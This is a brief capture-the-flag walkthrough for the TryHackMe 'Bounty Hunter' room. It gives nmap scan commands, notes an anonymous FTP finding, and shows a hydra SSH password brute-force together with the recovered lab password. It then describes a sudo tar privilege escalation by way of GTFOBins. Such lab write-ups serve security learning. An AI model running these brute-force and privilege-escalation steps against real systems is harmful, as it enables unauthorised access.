# Bounty Hunter
https://tryhackme.com/room/cowboyhacker

export ip=10.10.116.132

Initial Scan: `nmap -sC -sV -vv -oN nmap/initial $ip -T4 -A`
Quick Scan: `nmap -v --min-rate 10000 -p- -oN nmap/quick $ip -T4 -A`

**Findings:**
Port | Service
21 | FTP
22 | SSH
80 | Web Server

Anonymous FTP login available
2 files, some indicators of users & potential passwords
- lin

Most sense is "lin" so we'll bruteforce them.

**Bruteforce**
`hydra -l lin -P locks.txt $ip ssh`
found: RedDr4gonSynd1cat3

Found user flag!

**Privesc**
`sudo -l`
> (root) /bin/tar

https://gtfobins.github.io/gtfobins/tar/#sudo

Gained root & found root flag!
